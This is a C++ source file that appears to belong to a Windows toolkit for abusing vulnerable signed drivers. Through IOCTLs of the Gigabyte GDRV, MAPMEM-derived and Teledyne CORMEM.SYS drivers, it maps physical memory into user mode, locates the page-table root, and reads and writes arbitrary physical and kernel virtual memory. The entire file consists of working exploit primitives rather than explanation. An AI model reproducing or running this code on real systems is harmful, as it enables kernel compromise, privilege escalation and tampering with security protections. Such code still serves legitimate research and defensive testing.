/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       MAPMEM.CPP
*
*  VERSION:     1.48
*
*  DATE:        25 Mar 2026
*
*  MAPMEM driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/mapmem.h"

//
// Gigabyte/CODESYS/SuperBMC/etc drivers are based on MAPMEM.SYS Microsoft Windows NT 3.51 DDK example from 1993.
//

ULONG g_MapMem_MapIoctl;
ULONG g_MapMem_UnmapIoctl;

typedef PVOID(*PFN_MAPMEM_MAP_MEMORY)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes);

typedef VOID(*PFN_MAPMEM_UNMAP_MEMORY)(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID MappedSection);

/*
* MapMemMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MapMemMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID pMapSection = NULL;
    MAPMEM_PHYSICAL_MEMORY_INFO request;
    ULONG_PTR offset;
    ULONG mapSize;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.BusAddress.QuadPart = offset;
    request.Length = mapSize;

    if (supCallDriver(DeviceHandle,
        g_MapMem_MapIoctl,
        &request,
        sizeof(request),
        (PVOID)&pMapSection,
        sizeof(PVOID)))
    {
        return pMapSection;
    }

    return NULL;
}

/*
* MapMemUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MapMemUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    supCallDriver(DeviceHandle,
        g_MapMem_UnmapIoctl,
        &SectionToUnmap,
        sizeof(PVOID),
        NULL,
        0);
}

/*
* GioVirtualToPhysicalEx
*
* Purpose:
*
* Translate virtual address to the physical.
*
* WARNING:
* RED ALERT, GDRV always(!) truncates physical address to 4 bytes. DO NOT USE.
*
*/
BOOL WINAPI GioVirtualToPhysicalEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    GIO_VIRTUAL_TO_PHYSICAL request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    request.Address.QuadPart = VirtualAddress;

    if (supCallDriver(DeviceHandle,
        IOCTL_GDRV_VIRTUALTOPHYSICAL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *PhysicalAddress = request.Address.LowPart;
        bResult = TRUE;
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MapMemQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI MapMemQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD cbRead = 0x100000;
    ULONG_PTR pbLowStub1M = 0, PML4 = 0;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)MapMemMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        MapMemUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* MapMemVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI MapMemVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        MapMemQueryPML4Value,
        MapMemReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* MapMemReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI MapMemReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite,
    _In_ PFN_MAPMEM_MAP_MEMORY MapMemory,
    _In_ PFN_MAPMEM_UNMAP_MEMORY UnmapMemory
)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    ULONG_PTR offset;

    //
    // Map physical memory section.
    //
    mappedSection = MapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        UnmapMemory(DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MapMemReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI MapMemReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE,
        MapMemMapMemory,
        MapMemUnmapMemory);
}

/*
* MapMemWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI MapMemWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE,
        MapMemMapMemory,
        MapMemUnmapMemory);
}

/*
* MapMemWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI MapMemWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = MapMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE,
            MapMemMapMemory,
            MapMemUnmapMemory);

    }

    return bResult;
}

/*
* MapMemReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI MapMemReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = MapMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE,
            MapMemMapMemory,
            MapMemUnmapMemory);

    }

    return bResult;
}

/*
* MapMemRegisterDriver
*
* Purpose:
*
* Register MapMem based driver.
*
*/
BOOL WINAPI MapMemRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    UNREFERENCED_PARAMETER(DeviceHandle);

    switch (DriverId) {

    case IDR_SYSDRV3S:
        g_MapMem_MapIoctl = IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY;
        g_MapMem_UnmapIoctl = IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY;
        break;

    case IDR_GDRV:
    default:
        g_MapMem_MapIoctl = IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY;
        g_MapMem_UnmapIoctl = IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY;
        break;
    }

    return TRUE;
}

//
// These are specific to the Teledynes CORMEM.SYS driver.
//

/*
* CorMemMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID CorMemMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID pMapSection = NULL;
    CORMEM_MAPBUFFER_REQUEST request;
    ULONG_PTR offset;
    ULONG mapSize;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.PhysicalAddress.QuadPart = offset;
    request.Size = mapSize;

    if (supCallDriver(DeviceHandle,
        IOCTL_CORMEM_MAPBUFFER,
        &request,
        sizeof(request),
        (PVOID)&pMapSection,
        sizeof(PVOID)))
    {
        return pMapSection;
    }

    return NULL;
}

/*
* CorMemUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID CorMemUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    supCallDriver(DeviceHandle,
        IOCTL_CORMEM_UNMAPBUFFER,
        &SectionToUnmap,
        sizeof(PVOID),
        NULL,
        0);
}

/*
* CorMemQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI CorMemQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD cbRead = 0x100000;
    ULONG_PTR pbLowStub1M = 0, PML4 = 0;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)CorMemMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        CorMemUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* CorMemVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI CorMemVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        CorMemQueryPML4Value,
        CorMemReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* CorMemReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI CorMemReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE,
        CorMemMapMemory,
        CorMemUnmapMemory);
}

/*
* CorMemWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI CorMemWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE,
        CorMemMapMemory,
        CorMemUnmapMemory);
}


/*
* CorMemWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI CorMemWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = CorMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE,
            CorMemMapMemory,
            CorMemUnmapMemory);

    }

    return bResult;
}

/*
* CorMemReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI CorMemReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = CorMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE,
            CorMemMapMemory,
            CorMemUnmapMemory);

    }

    return bResult;
}
